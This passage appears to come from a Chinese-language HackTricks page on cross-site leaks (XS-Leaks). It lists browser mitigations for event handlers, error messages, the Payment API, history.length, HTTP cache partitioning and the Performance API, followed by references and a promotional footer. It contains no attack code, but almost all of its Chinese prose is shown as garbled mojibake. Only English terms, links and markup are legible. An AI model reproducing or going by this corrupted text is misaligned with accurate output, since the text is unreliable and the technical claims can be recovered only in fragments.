* **æµè§ˆå™¨æ‰©å±•**ã€‚å®‰å…¨æ„è¯†è¾ƒé«˜çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨**æµè§ˆå™¨æ‰©å±•æ¥é˜²æ­¢æŸäº›åŒ…å«æ–¹æ³•**ã€‚

### æ³„æ¼æŠ€æœ¯çš„ç¼“è§£æªæ–½

* **äº‹ä»¶å¤„ç†ç¨‹åº**ã€‚å¯¹äºåŸºäºæ³„æ¼æŠ€æœ¯çš„XS-Leaksï¼Œ**æœ€æœ‰æ•ˆçš„ç¼“è§£æªæ–½æ˜¯å…¨éƒ¨æ‹’ç»å®ƒä»¬**ï¼Œä½†è¿™å°†ç ´åäº’è”ç½‘ä¸Šçš„å¤§å¤šæ•°Webåº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œæˆ‘ä»¬å»ºè®®**å‡å°‘å¯ä»¥åœ¨äº‹ä»¶ä¸­æ”¶é›†çš„å¿…è¦ä¿¡æ¯çš„æ•°é‡**ã€‚ä¾‹å¦‚ï¼ŒCSPè¿è§„äº‹ä»¶ä¸åº”åœ¨blockedURIå­—æ®µä¸­åŒ…å«é‡å®šå‘ç›®æ ‡URLã€‚è¿™ç§è¡Œä¸ºå·²åœ¨FFå’Œè¾ƒæ–°ç‰ˆæœ¬çš„GCä¸­å®ç°-åªæœ‰SAä»ç„¶å­˜åœ¨æ¼æ´ã€‚
* **é”™è¯¯æ¶ˆæ¯**ã€‚ä¸ºäº†ç¼“è§£åŸºäºæ³„æ¼æŠ€æœ¯çš„XS-Leaksï¼Œæœ‰ä¸¤ä¸ªä¸»è¦è¦æ±‚ã€‚é¦–å…ˆï¼Œ**é”™è¯¯æ¶ˆæ¯ä¸å¾—åŒ…å«è¯¦ç»†ä¿¡æ¯**ï¼Œç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºæ¶ˆæ¯ã€‚å…¶æ¬¡ï¼Œæµè§ˆå™¨å¿…é¡»**æœ€å°åŒ–é”™è¯¯æ¶ˆæ¯çš„å‘ç”Ÿ**ã€‚XS-Leaksï¼ˆå¦‚SRIé”™è¯¯ã€ContentDocument XFOæˆ–Fetché‡å®šå‘ï¼‰ä¼šæ£€æµ‹æ˜¯å¦æŠ›å‡ºé”™è¯¯æ¶ˆæ¯ã€‚
* **å…¨å±€é™åˆ¶**ã€‚ä¿®å¤æ»¥ç”¨å…¨å±€é™åˆ¶çš„æ³„æ¼æŠ€æœ¯ç›¸å¯¹å¤æ‚ï¼Œå› ä¸ºå®ƒä»¬ä¾èµ–äºç‰©ç†é™åˆ¶ã€‚å› æ­¤ï¼Œä¸€èˆ¬å»ºè®®æ˜¯**åœ¨å°å‹æ¯ä¸ªç«™ç‚¹çš„åŸºç¡€ä¸Šé™åˆ¶å…¨å±€é™åˆ¶**ã€‚å¦‚æœå…¨å±€é™åˆ¶ä¸º1ï¼Œä¾‹å¦‚å¯¹äºPayment APIï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»»ä½•æ—¶å€™é™é»˜å°è¯•æ¿€æ´»WebPayment UIï¼Œåªæœ‰åœ¨æ²¡æœ‰å…¶ä»–é€‰é¡¹å¡åŒæ—¶ä½¿ç”¨UIæ—¶æ‰æˆåŠŸã€‚æˆ‘ä»¬å»ºè®®ä»…åœ¨ä½¿ç”¨å¯ä¿¡äº‹ä»¶æ—¶è®¿é—®Payment APIã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œé™¤éç”¨æˆ·æä¾›åŒæ„ï¼ˆä¾‹å¦‚åœ¨å¯¹è¯çª—å£ä¸Šè¿›è¡Œå·¦é”®å•å‡»ï¼‰ï¼Œå¦åˆ™å…¨å±€é™åˆ¶å°†è®¾ç½®ä¸ºé›¶ã€‚
* **å…¨å±€çŠ¶æ€**ã€‚ä»»ä½•**æµè§ˆå™¨å…¨å±€çŠ¶æ€çš„å±æ€§éƒ½ä¸åº”è¯¥æ˜¯å¯è®¿é—®çš„**ã€‚ä¾‹å¦‚ï¼ŒFFæ˜¯å”¯ä¸€åœ¨é‡å®šå‘å‘ç”Ÿæ—¶æ›´æ–°å…¨å±€çŠ¶æ€å†å²çš„æµè§ˆå™¨ï¼Œè¿™å¯¼è‡´è¯»å–history.lengthã€‚æµè§ˆå™¨åº”è¯¥åœ¨é‡å®šå‘å‘ç”Ÿæ—¶åˆ›å»ºä¸€ä¸ªæ–°çš„historyå±æ€§ï¼Œè€Œä¸æ˜¯å…¨å±€å­˜å‚¨å®ƒã€‚å…¶ä»–ç¤ºä¾‹æ˜¯å…±äº«èµ„æºï¼Œä¾‹å¦‚ç¼“å­˜ã€‚ç¼“å­˜æ³„æ¼æ»¥ç”¨æµè§ˆå™¨ä¸­æ‰€æœ‰æ‰“å¼€ç½‘ç«™ä½¿ç”¨çš„å…±äº«ç¼“å­˜ã€‚è¦å®Œå…¨ç¼“è§£ç¼“å­˜æ³„æ¼æŠ€æœ¯ï¼ŒHTTPç¼“å­˜å¿…é¡»åœ¨æ¯ä¸ªç«™ç‚¹ä¸Šè¿›è¡Œåˆ†åŒºï¼Œå¦‚SAã€GCå’ŒFFæ‰€å®ç°çš„é‚£æ ·ã€‚è¯·æ³¨æ„ï¼Œåœ¨SAä¸­ï¼Œiframeä¸å—ç¼“å­˜åˆ†åŒºçš„å½±å“ã€‚
* **æ€§èƒ½API**ã€‚æˆ‘ä»¬è¯æ˜äº†æ€§èƒ½APIæ˜¯ä¸€ç§å‡ºè‰²çš„æ³„æ¼æŠ€æœ¯ã€‚åœ¨è®¸å¤šXS-Leaksä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°è·¨æºè¯·æ±‚çš„å“åº”æ˜¯å¦å…·æœ‰æ€§èƒ½æ¡ç›®çš„å·®å¼‚ã€‚ä¸ºäº†ç»Ÿä¸€èµ·è§ï¼Œæˆ‘ä»¬å»ºè®®ç¡®ä¿æ‰€æœ‰è¯·æ±‚éƒ½å¿…é¡»åˆ›å»ºè¿™æ ·çš„æ¡ç›®ï¼Œå¹¶ä¸”åªè®°å½•è·¨æºè¯·æ±‚çš„æ­£ç¡®å­é›†çš„å®šæ—¶ä¿¡æ¯ã€‚
## å‚è€ƒèµ„æ–™

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
